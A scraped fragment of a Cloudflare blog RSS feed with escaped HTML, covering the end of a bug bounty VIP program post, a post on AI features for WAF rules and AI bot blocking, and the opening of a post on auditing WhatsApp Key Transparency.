            &lt;h2&gt;What is in scope for the new VIP program? &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-is-in-scope-for-the-new-vip-program"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The new bug bounty VIP program is an exclusive hub for select security researchers who either have the specialized technical expertise in the niche areas Cloudflare is building products in (such as Cloudflare Workers) or have demonstrated a deep understanding of our products and platform by actively participating in the public program with meaningful security findings. As a VIP member, security researchers will have access to beta testing environments for Cloudflare products&lt;b&gt;.&lt;/b&gt; This includes early access to our newest features and unannounced products before they go live.&lt;/p&gt;&lt;p&gt;The VIP program’s scope will be carefully modeled from Cloudflare's product release roadmap. Security researchers will have the opportunity to influence Cloudflare’s product and security development before release. VIP program participants also have the option to participate in external/gray box penetration testing activities (&lt;a href="https://docs.hackerone.com/en/articles/9064940-spot-checks"&gt;&lt;u&gt;Spot Checks&lt;/u&gt;&lt;/a&gt;) for higher bounties related to security findings for upcoming product releases or critical infrastructure and services. &lt;/p&gt;

            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;We believe that exceptional contributions deserve exceptional rewards. As a result, we’ve restructured our bounty offerings for the VIP program with higher payouts&lt;b&gt;.&lt;/b&gt; Recognizing the specialized skills and expertise required, VIP researchers will be eligible for significantly higher rewards.&lt;b&gt; &lt;/b&gt;We have also introduced bonus rewards for high-impact findings, particularly those that address critical vulnerabilities in our beta projects through the aforementioned Spot Checks. To further incentivize meaningful contributions, security researchers in our public program will receive milestone bonuses and be invited to our VIP program based on the number and quality of their submissions over time.&lt;/p&gt;&lt;div&gt;

          &lt;div&gt;
            &lt;h2&gt;What outcomes are we driving with the new VIP program?&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-outcomes-are-we-driving-with-the-new-vip-program"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The VIP bug bounty program’s focus is not only finding and fixing bugs, but it’s also aimed at fostering a deeper, more impactful relationship with our security researchers. Moreover, these outcomes align well with the &lt;a href="https://www.cisa.gov/securebydesign/pledge#:~:text=READ%20MORE-,Vulnerability%20disclosure%20policy,-Goal%3A%20Within%20one"&gt;&lt;u&gt;CISA Vulnerability Disclosure Policy (VDP) goal&lt;/u&gt;&lt;/a&gt;. By offering exclusive access to beta software and enhanced rewards, our goals are as follows:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Elevate security standards&lt;/b&gt;: VIP researchers focusing on the most critical assets allows for further hardening of the overall security posture of Cloudflare’s products and services. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Accelerate product development&lt;/b&gt;: Early identification of vulnerabilities allows the remediation of potential issues before they reach production, yielding faster, more secure, and more stable releases.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Foster innovation&lt;/b&gt;: Involving researchers in the development process creates an additional feedback loop that encourages innovative approaches to security challenges. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Encourage collaboration&lt;/b&gt;: The bug bounty team will encourage collaborative blog posts for select reports as a way to disseminate security learnings and build partnerships with researchers.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;This is a great professional growth opportunity for anyone in the technical research space as it gives participants the ability to work on cutting-edge technology with complex challenges, and can provide future opportunities for career/skill development.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;How does Cloudflare benefit from it?&lt;/h2&gt;

            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The launch of the VIP program marks a new chapter in Cloudflare’s security journey. We are excited about the opportunity to partner more closely with our top security researchers to build safer products for customers. Together, we can achieve new heights in security excellence:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Stronger security&lt;/b&gt;: Security researchers with expertise in niche topics can help enhance Cloudflare's defenses against emerging and novel threats.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Proactive risk management&lt;/b&gt;: The new VIP program provides Cloudflare an additional avenue to identify and mitigate risks early in the product release cycle, reducing the likelihood of future security incidents.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Reinforced trust&lt;/b&gt;: Our commitment to security is central to our customer relationships and the trust they place in Cloudflare; by continuously improving our security posture, we seek to preserve that trust.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;
          &lt;div&gt;
            &lt;h2&gt;How can you help?&lt;/h2&gt;

          &lt;p&gt;If you are a software manufacturer, we encourage you to familiarize yourself with CISA’s &lt;a href="https://www.cisa.gov/securebydesign"&gt;&lt;u&gt;‘Secure by Design’&lt;/u&gt;&lt;/a&gt; principles and create a plan to implement them in your company.&lt;/p&gt;&lt;p&gt;As an individual, we encourage you to participate in the &lt;a href="https://hackerone.com/cloudflare"&gt;&lt;u&gt;Cloudflare bug bounty program&lt;/u&gt;&lt;/a&gt; and promote cybersecurity awareness in your community.&lt;/p&gt;&lt;p&gt;Stay tuned for more updates, and if you’re part of our public program, keep submitting those reports — you might just earn an invitation to join the VIP ranks! You can also find more updates on our blog, as we build our roadmap to meet all seven CISA Secure by Design pledge goals by May 2025!&lt;/p&gt;&lt;p&gt;Let’s help build a better Internet together.&lt;/p&gt;</content:encoded><guid isPermaLink="false">6PcliMGa9hJMvd9HafSMwe</guid><category>Birthday Week</category><category>Security</category><category>Bug Bounty</category></item><item><title>AI Everywhere with the WAF Rule Builder Assistant, Cloudflare Radar AI Insights, and updated AI bot protection</title><link>https://blog.cloudflare.com/bringing-ai-to-cloudflare/</link><description>This year for Cloudflare’s birthday, we’ve extended our AI Assistant capabilities to help you build new WAF rules, added new AI bot &amp; crawler traffic insights to Radar, and given customers new AI bot</description><content:encoded>&lt;p&gt;The continued growth of AI has fundamentally changed the Internet over the past 24 months. AI is increasingly ubiquitous, and Cloudflare is leaning into the new opportunities and challenges it presents in a big way. This year for Cloudflare’s birthday, we’ve extended our AI Assistant capabilities to help you build new WAF rules, added AI bot traffic insights on Cloudflare Radar, and given customers new AI bot blocking capabilities.  &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;AI Assistant for WAF Rule Builder&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#ai-assistant-for-waf-rule-builder"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5RYC4wmCDbs0axY92FfkFk/a728906cb6a902dd1c78ec93a0f650c2/BLOG-2564_1.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;At Cloudflare, we’re always listening to your feedback and striving to make our products as user-friendly and powerful as possible. One area where we've heard your feedback loud and clear is in the complexity of creating custom and rate-limiting rules for our Web Application Firewall (WAF). With this in mind, we’re excited to introduce a new feature that will make rule creation easier and more intuitive: the AI Assistant for WAF Rule Builder. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7avSjubqlfg7L8ymKEztgk/7c3c31e50879ec64bccc384bdfcd5524/BLOG-2564_2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;By simply entering a natural language prompt, you can generate a custom or rate-limiting rule tailored to your needs. For example, instead of manually configuring a complex rule matching criteria, you can now type something like, "Match requests with low bot score," and the assistant will generate the rule for you. It’s not about creating the perfect rule in one step, but giving you a strong foundation that you can build on. &lt;/p&gt;&lt;p&gt;The assistant will be available in the Custom and Rate Limit Rule Builder for all WAF users. We’re launching this feature in Beta for all customers, and we encourage you to give it a try. We’re looking forward to hearing your feedback (via the UI itself) as we continue to refine and enhance this tool to meet your needs.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;AI bot traffic insights on Cloudflare Radar&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#ai-bot-traffic-insights-on-cloudflare-radar"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;AI platform providers use bots to crawl and scrape websites, vacuuming up data to use for model training. This is frequently done without the permission of, or a business relationship with, the content owners and providers. In July, Cloudflare urged content owners and providers to &lt;a href="https://blog.cloudflare.com/declaring-your-aindependence-block-ai-bots-scrapers-and-crawlers-with-a-single-click/"&gt;&lt;u&gt;“declare their AIndependence”&lt;/u&gt;&lt;/a&gt;, providing them with a way to block AI bots, scrapers, and crawlers with a single click. In addition to this so-called “easy button” approach, sites can provide more specific guidance to these bots about what they are and are not allowed to access through directives in a &lt;a href="https://www.cloudflare.com/en-gb/learning/bots/what-is-robots-txt/"&gt;&lt;u&gt;robots.txt&lt;/u&gt;&lt;/a&gt; file. Regardless of whether a customer chooses to block or allow requests from AI-related bots, Cloudflare has insight into request activity from these bots, and associated traffic trends over time.&lt;/p&gt;&lt;p&gt;Tracking traffic trends for AI bots can help us better understand their activity over time — which are the most aggressive and have the highest volume of requests, which launch crawls on a regular basis, etc. The new &lt;a href="https://radar.cloudflare.com/traffic#ai-bot-crawler-traffic"&gt;&lt;b&gt;&lt;u&gt;AI bot &amp;amp; crawler traffic &lt;/u&gt;&lt;/b&gt;&lt;u&gt;graph on Radar’s Traffic page&lt;/u&gt;&lt;/a&gt; provides insight into these traffic trends gathered over the selected time period for the top known AI bots. The associated list of bots tracked here is based on the &lt;a href="https://github.com/ai-robots-txt/ai.robots.txt"&gt;&lt;u&gt;ai.robots.txt list&lt;/u&gt;&lt;/a&gt;, and will be updated with new bots as they are identified. &lt;a href="https://developers.cloudflare.com/api/operations/radar-get-ai-bots-timeseries-group-by-user-agent"&gt;&lt;u&gt;Time series&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developers.cloudflare.com/api/operations/radar-get-ai-bots-summary-by-user-agent"&gt;&lt;u&gt;summary&lt;/u&gt;&lt;/a&gt; data is available from the Radar API as well. (Traffic trends for the full set of AI bots &amp;amp; crawlers &lt;a href="https://radar.cloudflare.com/explorer?dataSet=ai.bots"&gt;&lt;u&gt;can be viewed in the new Data Explorer&lt;/u&gt;&lt;/a&gt;.)&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h2&gt;Blocking more AI bots&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#blocking-more-ai-bots"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/UiFu8l6K4Pm3ulxTK3XU0/541d109e29a9ae94e4792fdf94f7e4aa/BLOG-2564_4.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;For Cloudflare’s birthday, we’re following up on our previous blog post, &lt;a href="https://blog.cloudflare.com/declaring-your-aindependence-block-ai-bots-scrapers-and-crawlers-with-a-single-click/"&gt;&lt;i&gt;&lt;u&gt;Declaring Your AIndependence&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;, with an update on the new detections we’ve added to stop AI bots. Customers who haven’t already done so can simply &lt;a href="https://dash.cloudflare.com/?to=/:account/:zone/security/bots/configure"&gt;&lt;u&gt;click the button&lt;/u&gt;&lt;/a&gt; to block AI bots to gain more protection for their website. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Enabling dynamic updates for the AI bot rule&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#enabling-dynamic-updates-for-the-ai-bot-rule"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The old button allowed customers to block &lt;i&gt;verified&lt;/i&gt; AI crawlers, those that respect robots.txt and crawl rate, and don’t try to hide their behavior. We’ve added new crawlers to that list, but we’ve also expanded the previous rule to include 27 signatures (and counting) of AI bots that &lt;i&gt;don’t &lt;/i&gt;follow the rules. We want to take time to say “thank you” to everyone who took the time to use our “&lt;a href="https://docs.google.com/forms/d/14bX0RJH_0w17_cAUiihff5b3WLKzfieDO4upRlo5wj8"&gt;&lt;u&gt;tip line&lt;/u&gt;&lt;/a&gt;” to point us towards new AI bots. These tips have been extremely helpful in finding some bots that would not have been on our radar so quickly. &lt;/p&gt;&lt;p&gt;For each bot we’ve added, we’re also adding them to our “Definitely automated” definition as well. So, if you’re a self-service plan customer using &lt;a href="https://blog.cloudflare.com/super-bot-fight-mode/"&gt;&lt;u&gt;Super Bot Fight Mode&lt;/u&gt;&lt;/a&gt;, you’re already protected. Enterprise Bot Management customers will see more requests shift from the “Likely Bot” range to the “Definitely automated” range, which we’ll discuss more below.&lt;/p&gt;&lt;p&gt;Under the hood, we’ve converted this rule logic to a &lt;a href="https://developers.cloudflare.com/waf/managed-rules/"&gt;&lt;u&gt;Cloudflare managed rule&lt;/u&gt;&lt;/a&gt; (the same framework that powers our WAF). This enables our security analysts and engineers to safely push updates to the rule in real-time, similar to how new WAF rule changes are rapidly delivered to ensure our customers are protected against the latest CVEs. If you haven’t logged back into the Bots dashboard since the previous version of our AI bot protection was announced, click the button again to update to the latest protection. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2tI8Yqxt1S0UPapImb32J4/6cb9e9bf423c370383edb820e5722929/BLOG-2564_5.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;The impact of new fingerprints on the model &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-impact-of-new-fingerprints-on-the-model"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;One hidden beneficiary of fingerprinting new AI bots is our ML model. &lt;a href="https://blog.cloudflare.com/cloudflare-bot-management-machine-learning-and-more/"&gt;&lt;u&gt;As we’ve discussed before&lt;/u&gt;&lt;/a&gt;, our global ML model uses supervised machine learning and greatly benefits from more sources of labeled bot data. Below, you can see how well our ML model recognized these requests as automated, before and after we updated the button, adding new rules. To keep things simple, we have shown only the top 5 bots by the volume of requests on the chart. With the introduction of our new managed rule, we have observed an improvement in our detection capabilities for the majority of these AI bots. Button v1 represents the old option that let customers block only verified AI crawlers, while Button v2 is the newly introduced feature that includes managed rule detections.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2CZVGyDCp9ZtMrZdIi49fE/aacd04d240e9348b5a9b65bad4b470e2/BLOG-2564_6.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;So how did we make our detections more robust? As we have mentioned before, sometimes &lt;a href="https://blog.cloudflare.com/cloudflare-bot-management-machine-learning-and-more/"&gt;&lt;i&gt;&lt;u&gt;a single attribute can give a bot away&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;. We developed a sophisticated set of heuristics tailored to these AI bots, enabling us to effortlessly and accurately classify them as such. Although our ML model was already detecting the vast majority of these requests, the integration of additional heuristics has resulted in a noticeable increase in detection rates for each bot, and ensuring we score every request correctly 100% of the time. Transitioning from a purely machine learning approach to incorporating heuristics offers several advantages, including faster detection times and greater certainty in classification. While deploying a machine learning model is complex and time-consuming, new heuristics can be created in minutes. &lt;/p&gt;&lt;p&gt;The initial launch of the AI bots block button was well-received and is now used by over 133,000 websites, with significant adoption even among our Free tier customers. The newly updated button, launched on August 20, 2024, is rapidly gaining traction. Over 90,000 zones have already adopted the new rule, with approximately 240 new sites integrating it every hour. Overall, we are now helping to protect the intellectual property of more than 146,000 sites from AI bots, and we are currently blocking 66 million requests daily with this new rule. Additionally, we’re excited to announce that support for configuring AI bots protection via Terraform will be available by the end of this year, providing even more flexibility and control for managing your bot protection settings.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Bot behavior&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#bot-behavior"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;With the enhancements to our detection capabilities, it is essential to assess the impact of these changes to bot activity on the Internet. Since the launch of the updated AI bots block button, we have been closely monitoring for any shifts in bot activity and adaptation strategies. The most basic fingerprinting technique we use to identify AI bot looking for simple user-agent matches. User-agent matches are important to monitor because they indicate the bot is transparently announcing who they are when they’re crawling a website. &lt;/p&gt;&lt;p&gt;The graph below shows a volume of traffic we label as AI bot over the past two months. The blue line indicates the daily request count, while the red line represents the monthly average number of requests. In the past two months, we have seen an average reduction of nearly 30 million requests, with a decrease of 40 million in the most recent month.This decline coincides with the release of Button v1 and Button v2. Our hypothesis is that with the new AI bots blocking feature, Cloudflare is blocking a majority of these bots, which is discouraging them from crawling. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/23ULxmxBIRskEONlWVIvlA/1dbd3d03239047492c2d4f7307217d97/BLOG-2564_7.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;This hypothesis is supported by the observed decline in requests from several top AI crawlers. Specifically, the Bytespider bot reduced its daily requests from approximately 100 million to just 50 million between the end of June and the end of August (see graph below). This reduction could be attributed to several factors, including our new AI bots block button and changes in the crawler's strategy.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5UwtyZSXULrVzIqLcICGKd/fdf02c15d17e1d7ed248ba5f8a97eb54/BLOG-2564_8.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;We have also observed an increase in the accountability of some AI crawlers. The most basic fingerprinting technique we use to identify AI bot looking for simple user-agent matches. User-agent matches are important to monitor because they indicate the bot is transparently announcing who they are when they’re crawling a website. These crawlers are now more frequently using their agents, reflecting a shift towards more transparent and responsible behavior. Notably, there has been a dramatic surge in the number of requests from the Perplexity user agent. This increase might be linked to &lt;a href="https://rknight.me/blog/perplexity-ai-is-lying-about-its-user-agent/"&gt;previous accusations&lt;u&gt; &lt;/u&gt;&lt;/a&gt;that Perplexity did not properly present its user agent, which could have prompted a shift in their approach to ensure better identification and compliance. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7Hq2vUMqqdNCyaxNTCg3JD/610ad53d57203203c5176229245c8086/BLOG-2564_9.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;These trends suggest that our updates are likely affecting how AI crawlers interact with content. We will continue to monitor AI bot activity to help users control who accesses their content and how. By keeping a close watch on emerging patterns, we aim to provide users with the tools and insights needed to make informed decisions about managing their traffic. &lt;/p&gt;

We are publishing the results of the proof verification to https://dash.key-transparency.cloudflare.com for independent researchers and security experts to compare against WhatsApp’s. Cloudflare does not have access to underlying public key material or message metadata as part of this infrastructure.</description><content:encoded>&lt;p&gt;Chances are good that today you’ve sent a message through an &lt;a href="https://www.cloudflare.com/learning/privacy/what-is-end-to-end-encryption"&gt;&lt;u&gt;end-to-end encrypted (E2EE)&lt;/u&gt;&lt;/a&gt; messaging app such as WhatsApp, Signal, or iMessage. While we often take the privacy of these conversations for granted, they in fact rely on decades of research, testing, and standardization efforts, the foundation of which is a &lt;a href="https://www.cloudflare.com/learning/ssl/how-does-public-key-encryption-work/"&gt;&lt;u&gt;public-private key exchange&lt;/u&gt;&lt;/a&gt;. There is, however, an oft-overlooked implicit trust inherent in this model: that the messaging app infrastructure is distributing the public keys of all of its users correctly.&lt;/p&gt;&lt;p&gt;Here’s an example: if Joe and Alice are messaging each other on WhatsApp, Joe uses Alice’s phone number to retrieve Alice’s public key from the WhatsApp database, and Alice receives Joe’s public key. Their messages are then encrypted using this key exchange, so that no one — even WhatsApp — can see the contents of their messages besides Alice and Joe themselves. However, in the unlikely situation where an attacker, Bob, manages to register a different public key in WhatsApp’s database, Joe would try to message Alice but unknowingly be messaging Bob instead. And while this threat is most salient for journalists, activists, and those most vulnerable to cyber attacks&lt;i&gt;, &lt;/i&gt;we believe that protecting the privacy and integrity of end-to-end encrypted conversations is for everyone.&lt;/p&gt;&lt;p&gt;There are several methods that end-to-end encrypted messaging apps have deployed thus far to protect the integrity of public key distribution, the most common of which is to do an in-person verification of the QR code fingerprint of your public key (&lt;a href="https://faq.whatsapp.com/2416198805185327?helpref=faq_content"&gt;&lt;u&gt;WhatsApp&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://signal.org/blog/safety-number-updates/"&gt;&lt;u&gt;Signal&lt;/u&gt;&lt;/a&gt; both have a version of this). As you can imagine, this experience is inconvenient and unwieldy, especially as your number of contacts and group chats increase.&lt;/p&gt;&lt;p&gt;Over the past few years, there have been significant developments in this area of cryptography, and WhatsApp has paved the way with their &lt;a href="https://engineering.fb.com/2023/04/13/security/whatsapp-key-transparency/"&gt;&lt;u&gt;Key Transparency announcement&lt;/u&gt;&lt;/a&gt;. But as an independent third party, Cloudflare can provide stronger reassurance: that’s why we’re excited to announce that we’re now verifying WhatsApp’s Key Transparency audit proofs. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Auditing: the next frontier of encryption &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#auditing-the-next-frontier-of-encryption"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;We didn’t build this in a vacuum: similar to how the web and messaging apps became encrypted over time, we see auditing public key infrastructure as the next logical step in securing Internet infrastructure. This solution builds upon learnings from &lt;a href="https://en.wikipedia.org/wiki/Certificate_Transparency"&gt;&lt;u&gt;Certificate Transparency&lt;/u&gt;&lt;/a&gt; and&lt;a href="https://binary.transparency.dev/"&gt;&lt;u&gt; Binary Transparency&lt;/u&gt;&lt;/a&gt;, which share some of the underlying data structure and cryptographic techniques, and we’re excited about the formation of a &lt;a href="https://mailarchive.ietf.org/arch/browse/keytrans/"&gt;&lt;u&gt;working group at the IETF&lt;/u&gt;&lt;/a&gt; to make multi-party operation of Key Transparency-like systems tractable for a broader set of use cases. &lt;/p&gt;&lt;p&gt;We see our role here as a pioneer of a real world deployment of this auditing infrastructure, working through and sharing the operational challenges of operating a system that is critical for a messaging app used by billions of people around the world.   &lt;/p&gt;&lt;p&gt;We’ve also done this before — in 2022, Cloudflare announced &lt;a href="https://blog.cloudflare.com/cloudflare-verifies-code-whatsapp-web-serves-users/"&gt;&lt;u&gt;Code Verify&lt;/u&gt;&lt;/a&gt;, a partnership in which we verify that the code delivered in the browser for &lt;a href="https://web.whatsapp.com/"&gt;&lt;u&gt;WhatsApp Web&lt;/u&gt;&lt;/a&gt; has not been tampered with. When users run WhatsApp in their browser, the &lt;a href="https://faq.whatsapp.com/639766781216714?cms_platform=web&amp;amp;helpref=faq_content"&gt;&lt;u&gt;WhatsApp Code Verify extension&lt;/u&gt;&lt;/a&gt; compares a hash of the code that is executing in the browser with the hash that Cloudflare has of the codebase, enabling WhatsApp web users to easily see whether the code that is executing is the code that was publicly committed to. &lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/451BUpYOdkMZ9KqtGKBbFQ/69edee8fe9e64d124b16908a95bf0933/Code_Verify_-_Blog.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;In Code Verify, Cloudflare builds a non-mutable chain associating the WhatsApp version with the hash of its code.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Cloudflare’s role in Key Transparency is similar in that we are checking that a tree-based directory of public keys (more on this later) has been constructed correctly, and has been done so consistently over time.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;How Key Transparency works&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-key-transparency-works"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The architectural foundation of Key Transparency is the &lt;a href="https://github.com/facebook/akd/"&gt;&lt;u&gt;Auditable Key Directory (AKD)&lt;/u&gt;&lt;/a&gt;: a tree-shaped data structure, constructed and maintained by WhatsApp, in which the nodes contain hashed contact details of each user. We’ll explain the basics here but if you’re interested in learning more, check out the &lt;a href="https://eprint.iacr.org/2018/607.pdf"&gt;&lt;u&gt;SEEMless&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://eprint.iacr.org/2023/081.pdf"&gt;&lt;u&gt;Parakeet&lt;/u&gt;&lt;/a&gt; papers.&lt;/p&gt;&lt;p&gt;The AKD tree is constructed by building a binary tree, each parent node of which is a hash of each of its left and right child nodes:&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5Dl16PIqBNBiKn6qhzanCU/b67a1128bef4ab8733337f720c53f160/Mini_tree_-_Blog.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Each child node on the tree contains contact and public key details for a user (shown here for illustrative purposes). In reality, Cloudflare only sees a hash of each node rather than Alice and Bob’s contact info in plaintext.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;An epoch describes a specific version of the tree at a given moment in time, identified by its root node. Using a structure similar to Code Verify, the WhatsApp Log stores each root node hash as part of an append-only time structure of updates.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/43FGTWfTV2aIaaMkfyplY2/8576b9c096bead64ede52a034481149b/Key_Transparency_combined_tree_-_Blog.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;What kind of changes are valid to be included in a given epoch? When a new person, Brian, joins WhatsApp, WhatsApp inserts a new “B” node in the AKD tree, and a new epoch. If Alice loses her phone and rotates her key, her “version” is updated to &lt;code&gt;v1&lt;/code&gt; in the next update.  &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;How we built the Auditor on Cloudflare Workers &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-we-built-the-auditor-on-cloudflare-workers"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The role of the Auditor is to provide two main guarantees: that epochs are globally unique, and that they are valid. They are, however, quite different: global uniqueness requires consistency on whether an epoch and its associated root hash has been seen, while validity is a matter of computation — is the transition from the previous epoch to the current one a correct tree transformation?&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Timestamping service&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#timestamping-service"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5QHtfUaKoIBcIcK5o6H53j/ebaa147f3b22de32a29754d3cd7e73bd/Key_Transparency_Auditor_3_.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Timestamping service architecture (Cloudflare Workers in Rust, using a Durable Object for storage)&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;At regular intervals, the WhatsApp Log puts all new updates into the tree, and cuts a new epoch in the format “{counter}/{previous}/{current}”. The counter is a number, whereby “previous” is a hexadecimal encoded hash of the previous tree root, and “current” is a hexadecimal encoded hash for the new tree root. As a shorthand, epochs can be referred to by their counter only.&lt;/p&gt;&lt;p&gt;Here’s an example:&lt;/p&gt;&lt;p&gt;&lt;code&gt;1001/d0bbf29c48716f26a951ae2a244eb1d070ee38865c29c8ad8174e8904e3cdc1a/e1006114485e8f0bbe2464e0ebac77af37bce76851745592e8dd5991ff2cd411&lt;/code&gt;&lt;/p&gt;&lt;p&gt;Once an epoch is constructed, the WhatsApp Log sends it to the Auditor for cross-signing, to ensure it has only been seen once. The Auditor adds a timestamp as to when this new epoch has been seen. Cloudflare’s Auditor uses a &lt;a href="https://developers.cloudflare.com/durable-objects/platform/known-issues/#global-uniqueness"&gt;&lt;u&gt;Durable Object&lt;/u&gt;&lt;/a&gt; for every epoch to create their timestamp. This guarantees the global uniqueness of an epoch, and the possibility of replay in the event the WhatsApp Log experiences an outage or is distributed across multiple locations. WhatsApp’s Log is expected to produce new epochs at regular intervals, given this constrains the propagation of public key updates seen by their users. Therefore, Cloudflare Auditor does not have to keep the durable object state forever. Once replay and consistency have been accounted for, this state is cleared. This is done after a month, thanks to durable object &lt;a href="https://developers.cloudflare.com/durable-objects/api/alarms/"&gt;&lt;u&gt;alarms&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Additional checks are performed by the service, such as checking that the epochs are consecutive, or that their digest is unique. This enforces a chain of epochs and their associated digests, provided by the WhatsApp Log and signed by the Auditor, providing a consistent view for all to see.&lt;/p&gt;&lt;p&gt;We decided to write this service in Rust because Workers rely on &lt;a href="https://github.com/cloudflare/workers-rs"&gt;&lt;u&gt;cloudflare/workers-rs&lt;/u&gt;&lt;/a&gt; bindings, and the auditable key directory library is also in Rust (&lt;a href="https://github.com/facebook/akd"&gt;&lt;u&gt;facebook/akd&lt;/u&gt;&lt;/a&gt;).&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Tree validation service&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#tree-validation-service"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
